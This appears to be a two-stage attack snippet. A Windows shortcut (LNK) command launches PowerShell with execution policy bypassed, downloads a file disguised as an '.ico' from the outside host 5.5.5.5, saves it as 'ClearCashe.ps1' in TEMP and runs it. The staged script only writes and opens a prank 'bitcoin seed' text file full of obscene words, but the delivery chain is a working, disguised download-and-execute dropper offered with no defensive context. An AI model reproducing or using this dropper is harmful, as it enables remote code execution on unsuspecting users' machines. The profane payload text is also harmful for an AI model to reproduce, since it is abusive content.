# lnk 1

%WinDir%\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -NoExit -Command "& { iwr -Uri 'http://5.5.5.5/x/2.ico' -OutFile $env:TEMP\ClearCashe.ps1; & $env:TEMP\ClearCashe.ps1 }"


# ico 

$filePath = Join-Path $env:TEMP "my_seed.txt"

$content = "bitcoin seed: anus penis vagina gay shit fuck slut dick cock asshole suck"

$content | Out-File -FilePath $filePath -Encoding UTF8

Write-Host "Файл создан: $filePath"

Start-Process -FilePath $filePath

Pause
